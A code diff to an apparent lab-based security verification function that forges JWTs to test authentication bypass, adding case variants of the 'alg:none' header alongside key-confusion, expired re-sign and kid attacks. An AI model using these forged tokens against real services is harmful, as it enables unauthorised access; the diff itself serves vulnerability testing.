@@ -9446,9 +9446,9 @@ def verify_generic_jwt_bypass(
         return res
     lab, base_url, container = boot
     try:
-        def _make_jwt_none(payload: dict) -> str:
+        def _make_jwt_none(payload: dict, alg_value: str = "none") -> str:
             header = _b64.urlsafe_b64encode(
-                _json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
+                _json.dumps({"alg": alg_value, "typ": "JWT"}).encode()).rstrip(b"=").decode()
             body_b64 = _b64.urlsafe_b64encode(
                 _json.dumps(payload).encode()).rstrip(b"=").decode()
             return f"{header}.{body_b64}."
@@ -9522,7 +9522,10 @@ def verify_generic_jwt_bypass(
         step(f"  JWT baseline sin auth: status={_baseline_status}")
 
         for label, jwt_token in [
-            ("alg:none bypass", _make_jwt_none(payload_data)),
+            ("alg:none bypass", _make_jwt_none(payload_data, "none")),
+            ("alg:None bypass", _make_jwt_none(payload_data, "None")),
+            ("alg:NONE bypass", _make_jwt_none(payload_data, "NONE")),
+            ("alg:nOnE bypass", _make_jwt_none(payload_data, "nOnE")),
             ("alg:none expired resign", _make_jwt_expired_resign(payload_data)),
             ("RS256→HS256 key confusion", _make_jwt_rs256_confusion(payload_data)),
             *_kid_attacks,
